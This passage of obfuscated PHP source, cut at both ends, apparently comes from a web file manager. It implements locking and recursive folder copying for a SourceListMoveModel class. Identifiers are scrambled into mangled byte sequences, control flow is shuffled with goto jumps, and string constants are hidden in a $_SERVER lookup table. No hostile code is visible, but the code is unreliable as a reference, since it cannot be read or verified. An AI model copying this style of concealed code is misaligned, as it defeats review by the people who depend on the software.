E›í¿–áÅÊ; dë¬³¤ëğÎ: $b•½Ì¿öêƒ =& $_SERVER[‡’¶øåüç˜]; $f°´Ù¿ñô¦ = $this->sourceInfo($DÎµ„ª™¸); $C‚·ÀƒÒìê = array($b•½Ì¿öêƒ[495] => array($b•½Ì¿öêƒ[496], $f°´Ù¿ñô¦[$b•½Ì¿öêƒ[472]] . $DÎµ„ª™¸ . $b•½Ì¿öêƒ[497]), $b•½Ì¿öêƒ[498] => 0); goto dêì“Áö£’; E›í¿–áÅÊ: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($c¦ø‹‚‚±) { goto D¬ØÀ«º¢Ù; D¬ØÀ«º¢Ù: $F¼¨¶¤¬İÜ =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($F¼¨¶¤¬İÜ[503], $c¦ø‹‚‚±); goto e¥‰ºç›‡ğ; e¥‰ºç›‡ğ: $e·ö¢ßÛî‹ = 1; $this->_lockEvent($c¦ø‹‚‚±, array($F¼¨¶¤¬İÜ[504], $F¼¨¶¤¬İÜ[505]), $e·ö¢ßÛî‹); $this->_lockParent($c¦ø‹‚‚±, array($F¼¨¶¤¬İÜ[505]), $e·ö¢ßÛî‹); goto DÈÇí‡¡Ó; DÈÇí‡¡Ó: $this->_lockEvent($c¦ø‹‚‚±, array($F¼¨¶¤¬İÜ[506], $F¼¨¶¤¬İÜ[507]), $e·ö¢ßÛî‹); $this->_lockCheckEnd($F¼¨¶¤¬İÜ[503], $c¦ø‹‚‚±); goto AŒì§Ò„ä; AŒì§Ò„ä: } public function lockCopyEnd($dÍŞ¯ÉÒê¡) { $a¿¼Ø‹¨© =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $EâŒÔÓ©¹± = 0; $this->_lockEvent($dÍŞ¯ÉÒê¡, array($a¿¼Ø‹¨©[504], $a¿¼Ø‹¨©[505]), $EâŒÔÓ©¹±); $this->_lockParent($dÍŞ¯ÉÒê¡, array($a¿¼Ø‹¨©[505]), $EâŒÔÓ©¹±); $this->_lockEvent($dÍŞ¯ÉÒê¡, array($a¿¼Ø‹¨©[506], $a¿¼Ø‹¨©[507]), $EâŒÔÓ©¹±); } public function lockWriteStart($aÚõåœ¾×Å, $c‚‰¥ååÓ¼ = '') { goto c¶ŠÊë¦˜; d»¯áº‰Ç: $this->_lockParent($aÚõåœ¾×Å, array($fƒ¡‰õçç[503], $fƒ¡‰õçç[505]), $C¨£…ëÕø); $this->_lockCheckEnd($fƒ¡‰õçç[504], $aÚõåœ¾×Å); goto Cßª‘•ºå¸; CµÏãÃ…İ: $C¨£…ëÕø = 1; $this->_lockKey($fƒ¡‰õçç[508] . $aÚõåœ¾×Å . $fƒ¡‰õçç[91] . $c‚‰¥ååÓ¼, $C¨£…ëÕø); $this->_lockEvent($aÚõåœ¾×Å, array($fƒ¡‰õçç[503], $fƒ¡‰õçç[505]), $C¨£…ëÕø); goto d»¯áº‰Ç; c¶ŠÊë¦˜: $fƒ¡‰õçç =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($fƒ¡‰õçç[504], $aÚõåœ¾×Å); goto CµÏãÃ…İ; Cßª‘•ºå¸: } public function lockWriteEnd($d³ƒ¥¸, $f÷½ÑåÅ = '') { $CˆÛ¹Úôß =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $dÁõ³Íåå = 0; $this->_lockKey($CˆÛ¹Úôß[508] . $d³ƒ¥¸ . $CˆÛ¹Úôß[91] . $f÷½ÑåÅ, $dÁõ³Íåå); $this->_lockEvent($d³ƒ¥¸, array($CˆÛ¹Úôß[503], $CˆÛ¹Úôß[505]), $dÁõ³Íåå); $this->_lockParent($d³ƒ¥¸, array($CˆÛ¹Úôß[503], $CˆÛ¹Úôß[505]), $dÁõ³Íåå); } public function lockMoveStart($Cñï²ÃåÄÊ) { goto e¾ÈÜâ‘µ¡; FÔèÚôŠë³: $F‹×Èê„ïñ = 1; $this->_lockKey($AÈªÅ¥—ßù[509] . $Cñï²ÃåÄÊ, $F‹×Èê„ïñ); $this->_lockEvent($Cñï²ÃåÄÊ, array($AÈªÅ¥—ßù[503], $AÈªÅ¥—ßù[504]), $F‹×Èê„ïñ); goto BçŸª‘Ÿ¼; e¾ÈÜâ‘µ¡: $AÈªÅ¥—ßù =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÈªÅ¥—ßù[505], $Cñï²ÃåÄÊ); goto FÔèÚôŠë³; BçŸª‘Ÿ¼: $this->_lockParent($Cñï²ÃåÄÊ, array($AÈªÅ¥—ßù[503], $AÈªÅ¥—ßù[505]), $F‹×Èê„ïñ); $this->_lockEvent($Cñï²ÃåÄÊ, array($AÈªÅ¥—ßù[510], $AÈªÅ¥—ßù[506], $AÈªÅ¥—ßù[507]), $F‹×Èê„ïñ); $this->_lockCheckEnd($AÈªÅ¥—ßù[505], $Cñï²ÃåÄÊ); goto dÔéŠ¦…˜×; dÔéŠ¦…˜×: } public function lockMoveEnd($a¸ÜÆˆ­Ï) { goto AÕœôõ®Ò; dê×ŠÑ’: $this->_lockEvent($a¸ÜÆˆ­Ï, array($fõÜï¯ñĞ¸[510], $fõÜï¯ñĞ¸[506], $fõÜï¯ñĞ¸[507]), $e¯ĞİÂŠñ); goto cÈ·²íâÜ; AÕœôõ®Ò: $fõÜï¯ñĞ¸ =& $_SERVER[‡’¶øåüç˜]; if (!$this->allowLock()) { return; } $e¯ĞİÂŠñ = 0; goto fÛ›Š‚ºÇÇ; fÛ›Š‚ºÇÇ: $this->_lockKey($fõÜï¯ñĞ¸[509] . $a¸ÜÆˆ­Ï, $e¯ĞİÂŠñ); $this->_lockEvent($a¸ÜÆˆ­Ï, array($fõÜï¯ñĞ¸[503], $fõÜï¯ñĞ¸[504]), $e¯ĞİÂŠñ); $this->_lockParent($a¸ÜÆˆ­Ï, array($fõÜï¯ñĞ¸[503], $fõÜï¯ñĞ¸[505]), $e¯ĞİÂŠñ); goto dê×ŠÑ’; cÈ·²íâÜ: } private function _lockCheck($dÔè¹ƒİç, $Eâ¯ÌğÛ…) { goto C¨ÒŒ§å´Ó; c°æ±±ˆì: CacheLock::setErrorMsg($aˆäƒ›¯æ…[157] . htmlspecialchars($cÒÇÄ‹´Ãö[$aˆäƒ›¯æ…[28]]) . $aˆäƒ›¯æ…[489] . $B„È‰†•î); $this->_lockKey($E©Åà¹Ë£±, 1); $this->_lockKey($E©Åà¹Ë£±, 0); goto dò…Â‘Êæí; EÙÙØï—Ñ»: $this->_lockTimeStart[$E©Åà¹Ë£±] = timeFloat(); if (!is_array($cÒÇÄ‹´Ãö)) { return; } $B„È‰†•î = LNG($aˆäƒ›¯æ…[511]); goto c°æ±±ˆì; dò…Â‘Êæí: $AÌÙô­Ü• = array_reverse($this->parentLevelArray($cÒÇÄ‹´Ãö[$aˆäƒ›¯æ…[472]])); foreach ($AÌÙô­Ü• as $F½Ø¯õ©Ê) { $E©Åà¹Ë£± = $dÔè¹ƒİç . $aˆäƒ›¯æ…[512] . $F½Ø¯õ©Ê; if (CacheLock::lockGet($aˆäƒ›¯æ…[513] . $E©Åà¹Ë£±)) { $cÒÇÄ‹´Ãö = $this->sourceInfo($F½Ø¯õ©Ê); CacheLock::setErrorMsg($aˆäƒ›¯æ…[157] . htmlspecialchars($cÒÇÄ‹´Ãö[$aˆäƒ›¯æ…[28]]) . $aˆäƒ›¯æ…[489] . $B„È‰†•î); $this->_lockKey($E©Åà¹Ë£±, 1); $this->_lockKey($E©Åà¹Ë£±, 0); } } goto bÎ‹â¨£÷“; C¨ÒŒ§å´Ó: $aˆäƒ›¯æ… =& $_SERVER[‡’¶øåüç˜]; $cÒÇÄ‹´Ãö = $this->sourceInfo($Eâ¯ÌğÛ…); $E©Åà¹Ë£± = $dÔè¹ƒİç . $aˆäƒ›¯æ…[91] . $Eâ¯ÌğÛ…; goto EÙÙØï—Ñ»; bÎ‹â¨£÷“: } private function _lockCheckEnd($f»êµâÏ”, $F´é¨ò¾‡±) { goto c¯«‹Ÿ–¼; cğÇêÇË¨ï: if (!isset($this->_lockTimeStart[$EÄ†Ã³³âÌ])) { return; } $BÕÉç×·Á = timeFloat() - $this->_lockTimeStart[$EÄ†Ã³³âÌ]; unset($this->_lockTimeStart[$EÄ†Ã³³âÌ]); goto cÚƒ‰ê®Ÿ; cÚƒ‰ê®Ÿ: if ($BÕÉç×·Á > 0.5) { unset(self::$cacheSourceInfo[$Bª÷ÊÈ‘[422] . $F´é¨ò¾‡±]); } $f¤¿º’Ú‰ù = $this->sourceInfo($F´é¨ò¾‡±); if (!$f¤¿º’Ú‰ù) { show_json(LNG($Bª÷ÊÈ‘[101]), !1); } goto a‘µº‘Ø¯; c¯«‹Ÿ–¼: $Bª÷ÊÈ‘ =& $_SERVER[‡’¶øåüç˜]; $EÄ†Ã³³âÌ = $f»êµâÏ” . $Bª÷ÊÈ‘[91] . $F´é¨ò¾‡±; CacheLock::setErrorMsg($Bª÷ÊÈ‘[365]); goto cğÇêÇË¨ï; a‘µº‘Ø¯: } private function _lockParent($D­­›¼Ê¾„, $e±éŠê¦‰¯, $e¯¥Ã’¿ƒ¤) { if (!$this->autoLockSet) { return; } $EÏ’ğÚÜ–— = $this->sourceInfo($D­­›¼Ê¾„); if (!is_array($EÏ’ğÚÜ–—)) { return; } $dœ´¬‹¶¸î = array_reverse($this->parentLevelArray($EÏ’ğÚÜ–—[$_SERVER[‡’¶øåüç˜][472]])); foreach ($dœ´¬‹¶¸î as $fç¸ã) { $this->_lockEvent($fç¸ã, $e±éŠê¦‰¯, $e¯¥Ã’¿ƒ¤); } } private function _lockEvent($d•äƒãğ’, $CùÙ”¾Æ¦, $Eˆ¨İ–’±) { $E­†ĞÒË• =& $_SERVER[‡’¶øåüç˜]; if (!$this->autoLockSet) { return; } foreach ($CùÙ”¾Æ¦ as $FÉÙİÆÇö») { $CğÆë˜Ö = $FÉÙİÆÇö» . $E­†ĞÒË•[91] . $d•äƒãğ’; if ($Eˆ¨İ–’± && CacheLock::lockGet($E­†ĞÒË•[513] . $CğÆë˜Ö)) { continue; } $this->_lockKey($CğÆë˜Ö, $Eˆ¨İ–’±); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($bÃœÈÔ‹È°, $eàÇÅ©±®Ã = 1) { $CÅî£ÒÛÏ… = $_SERVER[‡’¶øåüç˜][513] . md5($bÃœÈÔ‹È°); if ($eàÇÅ©±®Ã) { if (isset(self::$_lockItemArr[$CÅî£ÒÛÏ…])) { return; } self::$_lockItemArr[$CÅî£ÒÛÏ…] = 1; CacheLock::lock($CÅî£ÒÛÏ…, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$CÅî£ÒÛÏ…])) { return; } unset(self::$_lockItemArr[$CÅî£ÒÛÏ…]); CacheLock::unlock($CÅî£ÒÛÏ…); } } public function isParentOf($fš‘µ³ˆ‚å, $eê¥ÄãÀ­–) { goto DÛà¦Å¿æÆ; FÂªÍÛÉ¿: $A‘«êºâ = $fá¤—“¶øš[$d¡Ô·¯„¡Õ[472]] . $fá¤—“¶øš[$d¡Ô·¯„¡Õ[381]] . $d¡Ô·¯„¡Õ[47]; $fŞ‘¦¿Ê¼ø = $f„í¼˜¯ˆ¶[$d¡Ô·¯„¡Õ[472]] . $f„í¼˜¯ˆ¶[$d¡Ô·¯„¡Õ[381]] . $d¡Ô·¯„¡Õ[47]; $B£íã¿ƒöğ = strpos($fŞ‘¦¿Ê¼ø, $A‘«êºâ) === 0; goto E¾‹‹é°Çğ; DÛà¦Å¿æÆ: $d¡Ô·¯„¡Õ =& $_SERVER[‡’¶øåüç˜]; $fá¤—“¶øš = $this->sourceInfo($fš‘µ³ˆ‚å); $f„í¼˜¯ˆ¶ = $this->sourceInfo($eê¥ÄãÀ­–); goto FÂªÍÛÉ¿; E¾‹‹é°Çğ: return $B£íã¿ƒöğ; goto AÈßÏëî; AÈßÏëî: } private $targetIsDelete = 0; public function copy($A“¬Ñğíî, $eØ÷‹¥Î¨, $d¯‰‚åæ²Ò = REPEAT_REPLACE, $aö´“À¬Â = '') { goto D™×Œ­ì‘Ò; bƒßÌÇÔ¯: $this->updateModifyTime($eØ÷‹¥Î¨); return $FˆŞòì¶; goto bÜ¹ï—Üì; a¶¯ã™ÉÈ: $this->saveAll($cš¸éä’¢Ë[$c’×òÂ¾Ş[516]]); Model($c’×òÂ¾Ş[171])->linkAdd($cš¸éä’¢Ë[$c’×òÂ¾Ş[514]]); $this->folderSizeReset($eØ÷‹¥Î¨); goto bƒßÌÇÔ¯; D™×Œ­ì‘Ò: $c’×òÂ¾Ş =& $_SERVER[‡’¶øåüç˜]; $A®¦á˜Äòó = $this->sourceInfo($A“¬Ñğíî); $f¥íëŒ”½¹ = $this->sourceInfo($eØ÷‹¥Î¨); goto DËƒ•´»ì£; CŞ£‘öÌ±‡: if ($A®¦á˜Äòó[$c’×òÂ¾Ş[382]] == $c’×òÂ¾Ş[83] && $dÛÆßŠÎ£ == $FˆŞòì¶) { $this->folderSizeResetChildren($dÛÆßŠÎ£); } Model($c’×òÂ¾Ş[517])->addAll($cš¸éä’¢Ë[$c’×òÂ¾Ş[515]], array(), !0); if ($dÛÆßŠÎ£ != $FˆŞòì¶ || $A®¦á˜Äòó[$c’×òÂ¾Ş[382]] == $c’×òÂ¾Ş[83]) { Model($c’×òÂ¾Ş[518])->eventCopy($FˆŞòì¶); } goto a¶¯ã™ÉÈ; bªÖ©†¯„: $this->targetIsDelete = intval($A®¦á˜Äòó[$c’×òÂ¾Ş[409]]); $dÛÆßŠÎ£ = $this->fileNameExistCache($eØ÷‹¥Î¨, $A®¦á˜Äòó[$c’×òÂ¾Ş[28]]); $FˆŞòì¶ = $this->_copy($A“¬Ñğíî, $eØ÷‹¥Î¨, $d¯‰‚åæ²Ò, $cš¸éä’¢Ë, !0, $aö´“À¬Â); goto B´óÅÅ„ÍÛ; DËƒ•´»ì£: if (!$A®¦á˜Äòó || !$f¥íëŒ”½¹ || $f¥íëŒ”½¹[$c’×òÂ¾Ş[382]] != $c’×òÂ¾Ş[83]) { return !1; } if ($this->isParentOf($A“¬Ñğíî, $eØ÷‹¥Î¨)) { return !1; } $cÍàœÙ”µ  = $aö´“À¬Â ? $aö´“À¬Â : $A®¦á˜Äòó[$c’×òÂ¾Ş[28]]; goto AùŒÓºîö; AùŒÓºîö: $this->lockCopyStart($A“¬Ñğíî); $this->lockWriteStart($eØ÷‹¥Î¨, $cÍàœÙ”µ ); $cš¸éä’¢Ë = array($c’×òÂ¾Ş[514] => array(), $c’×òÂ¾Ş[515] => array(), $c’×òÂ¾Ş[516] => array()); goto bªÖ©†¯„; B´óÅÅ„ÍÛ: $this->_childrenListClear(); $this->lockCopyEnd($A“¬Ñğíî); $this->lockWriteEnd($eØ÷‹¥Î¨, $cÍàœÙ”µ ); goto CŞ£‘öÌ±‡; bÜ¹ï—Üì: } private function _copy($d‰Üİªè“¬, $Bïƒî¾Ô¦´, $a°²óéß‚, &$fÛ«›‰¶–, $c¬©…Åâí, $eÇ×ßÚ‡¶ = '') { goto AÉÄ¿Ÿ…¾½; AÉÄ¿Ÿ…¾½: $B¢å“ ­Ğ» =& $_SERVER[‡’¶øåüç˜]; $Eá·îŸƒêÑ = $this->sourceInfoCache($d‰Üİªè“¬); $AëÎ‡Á«Êõ = $Eá·îŸƒêÑ[$B¢å“ ­Ğ»[382]] == $B¢å“ ­Ğ»[83]; goto e‰³³ÏåÔÂ; d÷‘‘³Ç‡í: return $bõêÂÔÅ¤ê; goto a«Ö½ÊÈçî; EõÅ¿ç¿¹¬: if (!$eï„º­¡Š) { return $this->_copyCreate($d‰Üİªè“¬, $Bïƒî¾Ô¦´, $Bó’ê „›ó, $fÛ«›‰¶–); } $bõêÂÔÅ¤ê = $eï„º­¡Š; if ($AëÎ‡Á«Êõ) { if ($a°²óéß‚ == REPEAT_RENAME_FOLDER) { $Bó’ê „›ó = $this->fileNameAutoCache($Bïƒî¾Ô¦´, $Bó’ê „›ó, $a°²óéß‚, $AëÎ‡Á«Êõ); $bõêÂÔÅ¤ê = $this->_copyCreate($d‰Üİªè“¬, $Bïƒî¾Ô¦´, $Bó’ê „›ó, $fÛ«›‰¶–); } else { $AêÁ‘Ä™¶ = $this->_childrenList($d‰Üİªè“¬); foreach ($AêÁ‘Ä™¶ as $dŞË‚×±³) { $this->_copy($dŞË‚×±³[$B¢å“ ­Ğ»[381]], $eï„º­¡Š, $a°²óéß‚, $fÛ«›‰¶–, !1); } } } else { if ($a°²óéß‚ == REPEAT_RENAME || $a°²óéß‚ == REPEAT_RENAME_FOLDER) { $Bó’ê „›ó = $this->fileNameAutoCache($Bïƒî¾Ô¦´, $Bó’ê „›ó, $a°²óéß‚, $AëÎ‡Á«Êõ); $bõêÂÔÅ¤ê = $this->_copyCreate($d‰Üİªè“¬, $Bïƒî¾Ô¦´, $Bó’ê „›ó, $fÛ«›‰¶–); } else { if ($a°²óéß‚ == REPEAT_REPLACE) { $a¸¹ÂÍ®³ = $this->sourceInfoCache($eï„º­¡Š); $d¦œÂ¾•™² = $this->fileHistory($a¸¹ÂÍ®³, $Eá·îŸƒêÑ[$B¢å“ ­Ğ»[431]], $Eá·îŸƒêÑ[$B¢å“ ­Ğ»[77]]); if ($d¦œÂ¾•™²) { $fÛ«›‰¶–[$B¢å“ ­Ğ»[514]][] = $Eá·îŸƒêÑ[$B¢å“ ­Ğ»[431]]; } } else { if ($a°²óéß‚ == REPEAT_SKIP) { } } } Hook::trigger($B¢å“ ­Ğ»[519], array($B¢å“ ­Ğ»[520], $Eá·îŸƒêÑ, 0)); } goto d÷‘‘³Ç‡í; e‰³³ÏåÔÂ: $Bó’ê „›ó = $eÇ×ßÚ‡¶ ? $eÇ×ßÚ‡¶ : $Eá·îŸƒêÑ[$B¢å“ ­Ğ»[28]]; $eï„º­¡Š = $this->fileNameExistCache($Bïƒî¾Ô¦´, $Bó’ê „›ó); if ($c¬©…Åâí) { $this->_childrenAllMake($d‰Üİªè“¬); if ($AëÎ‡Á«Êõ && $eï„º­¡Š) { $this->_childrenAllMake($eï„º­¡Š); } } goto EõÅ¿ç¿¹¬; a«Ö½ÊÈçî: } private function _copyCreate($dËß“Ş¯ , $C‡±šäßé¤, $a¾ËöÏÆ¥, &$B²ãÍé¡) { goto EãÄÜÃãµº; EãÜ•‘§¤¤: if ($CÀœÓ’ùŠš[$bç„ôÓã¼¦[382]] != $bç„ôÓã¼¦[83]) { $B²ãÍé¡[$bç„ôÓã¼¦[514]][] = $CÀœÓ’ùŠš[$bç„ôÓã¼¦[431]]; return $dä‹ÔÂ¼é¿; } $cÖÕ…ÂœÁµ = array(); $F°»š™™µ• = array(); goto fİ§¼¯Êœ; bÚñ£¾í¦: $this->addAll($F°»š™™µ•, array(), !1); $a¯äòÆ×æ¸ = $this->where(array($bç„ôÓã¼¦[474] => $dä‹ÔÂ¼é¿))->select(); $DŠ‡’í¦ò¢ = $this->_childrenMakeRelation($cÖÕ…ÂœÁµ, $a¯äòÆ×æ¸); goto F«ïí‡ñ¢™; BŞë¶‡¶÷¦: $EÒ†ØÄàØ = $this->_makeItemData($CÀœÓ’ùŠš, $f¨ß™¦„øÑ, $a¾ËöÏÆ¥); Hook::trigger($bç„ôÓã¼¦[521], $EÒ†ØÄàØ); Hook::trigger($bç„ôÓã¼¦[522], array($bç„ôÓã¼¦[523], $EÒ†ØÄàØ, 0)); goto EÉÊ‰ÑÁ; F«ïí‡ñ¢™: $DŠ‡’í¦ò¢[$dËß“Ş¯ ] = $dä‹ÔÂ¼é¿; $D™ƒ’³Ì·Ï = array(); $c‘íÄ½¯Š¿ = array(); goto CÍˆÚ‡œÃ÷; d†’ĞâÂ×: $d´¦â—¢– = $this->sourceInfo($dä‹ÔÂ¼é¿); foreach ($cÖÕ…ÂœÁµ as $BÆ…·Ò–ÕÈ) { $AÄ¢¤ÑØÜ» = $this->_makeItemData($BÆ…·Ò–ÕÈ, $d´¦â—¢–, $BÆ…·Ò–ÕÈ[$bç„ôÓã¼¦[28]]); $AÄ¢¤ÑØÜ»[$bç„ôÓã¼¦[472]] = $BÆ…·Ò–ÕÈ[$bç„ôÓã¼¦[472]]; $F°»š™™µ•[] = $AÄ¢¤ÑØÜ»; } $this->chunkEventSet($bç„ôÓã¼¦[524], array($bç„ôÓã¼¦[525], $EÒ†ØÄàØ, $fÁÙİÛé„›)); goto bÚñ£¾í¦; EãÄÜÃãµº: $bç„ôÓã¼¦ =& $_SERVER[‡’¶øåüç˜]; $CÀœÓ’ùŠš = $this->sourceInfoCache($dËß“Ş¯ ); $f¨ß™¦„øÑ = $this->sourceInfoCache($C‡±šäßé¤); goto BŞë¶‡¶÷¦; E¹“Üè„Æ: $this->chunkEventSet($bç„ôÓã¼¦[528], array($bç„ôÓã¼¦[529], $EÒ†ØÄàØ, $fÁÙİÛé„›)); $this->saveAll($c‘íÄ½¯Š¿); return $dä‹ÔÂ¼é¿; goto aÂ·³Õ©¡›; CÍˆÚ‡œÃ÷: foreach ($a¯äòÆ×æ¸ as $BÆ…·Ò–ÕÈ) { $Fí×«ê’˜ = $BÆ…·Ò–ÕÈ[$bç„ôÓã¼¦[381]]; $b…ĞÇ©ÂŒñ = $this->_childrenMatch($DŠ‡’í¦ò¢, $BÆ…·Ò–ÕÈ, $d´¦â—¢–); $D™ƒ’³Ì·Ï[] = array($bç„ôÓã¼¦[381], $Fí×«ê’˜, $bç„ôÓã¼¦[474], $b…ĞÇ©ÂŒñ[$bç„ôÓã¼¦[474]]); $c‘íÄ½¯Š¿[] = array($bç„ôÓã¼¦[381], $Fí×«ê’˜, $bç„ôÓã¼¦[472], $b…ĞÇ©ÂŒñ[$bç„ôÓã¼¦[472]]); $this->_copyApplyMeta($BÆ…·Ò–ÕÈ, $B²ãÍé¡); if ($BÆ…·Ò–ÕÈ[$bç„ôÓã¼¦[382]] != $bç„ôÓã¼¦[83]) { $B²ãÍé¡[$bç„ôÓã¼¦[514]][] = $BÆ…·Ò–ÕÈ[$bç„ôÓã¼¦[431]]; } } $this->chunkEventSet($bç„ôÓã¼¦[526], array($bç„ôÓã¼¦[527], $EÒ†ØÄàØ, $fÁÙİÛé„›)); $this->saveAll($D™ƒ’³Ì·Ï); goto E¹“Üè„Æ; EÉÊ‰ÑÁ: $dä‹ÔÂ¼é¿ = $this->add($EÒ†ØÄàØ); $f´¯ª¶ä…¤ = array($bç„ôÓã¼¦[381] => $dä‹ÔÂ¼é¿, $bç„ôÓã¼¦[28] => $a¾ËöÏÆ¥); $this->_copyApplyMeta($f´¯ª¶ä…¤, $B²ãÍé¡); goto EãÜ•‘§¤¤; fİ§¼¯Êœ: $this->_childrenListAll($dËß“Ş¯ , $cÖÕ…ÂœÁµ); $fÁÙİÛé„› = count($cÖÕ…ÂœÁµ); if ($fÁÙİÛé„› == 0) { return $dä‹ÔÂ¼é¿; } goto d†’ĞâÂ×; aÂ·³Õ©¡›: } private function _childrenMakeRelation($dªè­ÎÜºÈ, $FèÈâ´Ì…•) { $eğ·†˜á…ó =& $_SERVER[‡’¶øåüç˜]; $fìèÈ¶×§§ = array(); $DóêÒ„„ì§ = array(); foreach ($dªè­ÎÜºÈ as $dËƒ‡»¹­) { $CğÛæ‡ËÚ = $dËƒ‡»¹­[$eğ·†˜á…ó[28]] . $eğ·†˜á…ó[8] . $dËƒ‡»¹­[$eğ·†˜á…ó[472]]; $fìèÈ¶×§§[$CğÛæ‡ËÚ] = $dËƒ‡»¹­[$eğ·†˜á…ó[381]]; } foreach ($FèÈâ´Ì…• as $dËƒ‡»¹­) { $CğÛæ‡ËÚ = $dËƒ‡»¹­[$eğ·†˜á…ó[28]] . $eğ·†˜á…ó[8] . $dËƒ‡»¹­[$eğ·†˜á…ó[472]]; $c¹·µõİ¼ = $fìèÈ¶×§§[$CğÛæ‡ËÚ]; $DóêÒ„„ì§[$c¹·µõİ¼] = $dËƒ‡»¹­[$eğ·†˜á…ó[381]]; } return $DóêÒ„„ì§; } private function _childrenMatch($Fã¬¼¸°é, $dğ‘È¥©÷, $e­Ô’´‚‹°) { goto BÆåáÃÕ–; dĞÒµÒŠ“Ó: foreach ($Fæà»›ˆÏ as $d¹Óƒ“Õ—à) { if (isset($Fã¬¼¸°é[$d¹Óƒ“Õ—à])) { $e…×‘Ò– .= $Fã¬¼¸°é[$d¹Óƒ“Õ—à] . $Cà¢£“Ø«Æ[530]; } } $e…×‘Ò– = rtrim($e…×‘Ò–, $Cà¢£“Ø«Æ[47]) . $Cà¢£“Ø«Æ[47]; $D¸‚ÍÇá‹¥ = $this->parentLevelArray($e…×‘Ò–); goto e½ğà¨µ¶; BÆåáÃÕ–: $Cà¢£“Ø«Æ =& $_SERVER[‡’¶øåüç˜]; $e…×‘Ò– = $e­Ô’´‚‹°[$Cà¢£“Ø«Æ[472]]; $Fæà»›ˆÏ = $this->parentLevelArray($dğ‘È¥©÷[$Cà¢£“Ø«Æ[472]]); goto dĞÒµÒŠ“Ó; e½ğà¨µ¶: $F•‹ÀÅ„é‡ = $D¸‚ÍÇá‹¥[count($D¸‚ÍÇá‹¥) - 1]; return array($Cà¢£“Ø«Æ[474] => $F•‹ÀÅ„é‡, $Cà¢£“Ø«Æ[472] => $e…×‘Ò–); goto Eï¾Ù‡Šµ; Eï¾Ù‡Šµ: } private function _makeItemData($FÅ×¢æ“æÕ, $C…Êƒ¦‹¥, $E‹ËÆÚ…Ì¹) { $EãÍ¼Ââù© =& $_SERVER[‡’¶øåüç˜]; $b’åÍ‚Í–Ÿ = array($EãÍ¼Ââù©[531] => $FÅ×¢æ“æÕ[$EãÍ¼Ââù©[382]], $EãÍ¼Ââù©[398] => $E‹ËÆÚ…Ì¹, $EãÍ¼Ââù©[532] => $FÅ×¢æ“æÕ[$EãÍ¼Ââù©[384]], $EãÍ¼Ââù©[432] => $FÅ×¢æ“æÕ[$EãÍ¼Ââù©[431]], $EãÍ¼Ââù©[533] => $FÅ×¢æ“æÕ[$EãÍ¼Ââù©[77]], $EãÍ¼Ââù©[534] => $C…Êƒ¦‹¥[$EãÍ¼Ââù©[383]], $EãÍ¼Ââù©[535] => $C…Êƒ¦‹¥[$EãÍ¼Ââù©[469]], $EãÍ¼Ââù©[536] => USER_ID, $EãÍ¼Ââù©[537] => USER_ID, $EãÍ¼Ââù©[380] => $C…Êƒ¦‹¥[$EãÍ¼Ââù©[381]], $EãÍ¼Ââù©[538] => $C…Êƒ¦‹¥[$EãÍ¼Ââù©[472]] . $C…Êƒ¦‹¥[$EãÍ¼Ââù©[381]] . $EãÍ¼Ââù©[47], $EãÍ¼Ââù©[408] => 0, $EãÍ¼Ââù©[539] => $EãÍ¼Ââù©[33]); return $b’åÍ‚Í–Ÿ; } private function _copyApplyMeta($aêó’¡Ø, &$dÏß§ƒøÍ‰) { $D‘¯”¾Ö­ =& $_SERVER[‡’¶øåüç˜]; $cÌ»Ğœ°¯± = $aêó’¡Ø[$D‘¯”¾Ö­[381]]; $B¸ƒÊÏ£†„ = $aêó’¡Ø[$D‘¯”¾Ö­[28]]; if (!isset($aêó’¡Ø[$D‘¯”¾Ö­[540]]) || !$aêó’¡Ø[$D‘¯”¾Ö­[540]] || $aêó’¡Ø[$D‘¯”¾Ö­[540]] == $D‘¯”¾Ö­[481]) { $dÏß§ƒøÍ‰[$D‘¯”¾Ö­[516]][] = array($D‘¯”¾Ö­[381], $cÌ»Ğœ°¯±, $D‘¯”¾Ö­[540], short_id($cÌ»Ğœ°¯±)); } if (Input::check($B¸ƒÊÏ£†„, $D‘¯”¾Ö­[541])) { $dÏß§ƒøÍ‰[$D‘¯”¾Ö­[515]][] = array($D‘¯”¾Ö­[381] => $cÌ»Ğœ°¯±, $D‘¯”¾Ö­[89] => $D‘¯”¾Ö­[428], $D‘¯”¾Ö­[363] => str_replace($D‘¯”¾Ö­[50], $D‘¯”¾Ö­[33], Pinyin::encode($B¸ƒÊÏ£†„))); $dÏß§ƒøÍ‰[$D‘¯”¾Ö­[515]][] = array($D‘¯”¾Ö­[381] => $cÌ»Ğœ°¯±, $D‘¯”¾Ö­[89] => $D‘¯”¾Ö­[427], $D‘¯”¾Ö­[363] => Pinyin::encode($B¸ƒÊÏ£†„, $D‘¯”¾Ö­[542])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($C›Áæ²èÌ°) { goto Eƒôšàí×Å; aİ¿Å…¶ƒÂ: $b•³çˆƒöŸ = array($EÉğ¡¯öÕ‘[472] => array($EÉğ¡¯öÕ‘[496], $fŒ¿…§¾¥‡[$EÉğ¡¯öÕ‘[472]] . $C›Áæ²èÌ° . $EÉğ¡¯öÕ‘[497]), $EÉğ¡¯öÕ‘[409] => $this->targetIsDelete); $Eîä‚„–ˆ = $this->field($E‡Ë¹å¯Ö¢)->where($b•³çˆƒöŸ)->select(); if (!$Eîä‚„–ˆ) { return; } goto bšíƒ¾¹„‘; Eƒôšàí×Å: $EÉğ¡¯öÕ‘ =& $_SERVER[‡’¶øåüç˜]; $fŒ¿…§¾¥‡ = $this->sourceInfo($C›Áæ²èÌ°); $E‡Ë¹å¯Ö¢ = $EÉğ¡¯öÕ‘[410]; goto aİ¿Å…¶ƒÂ; bšíƒ¾¹„‘: $Eîä‚„–ˆ = array_to_keyvalue($Eîä‚„–ˆ, $EÉğ¡¯öÕ‘[381]); foreach ($Eîä‚„–ˆ as $C¿¤¹“ïàœ) { $bÅ¤»ÓšÚ… = 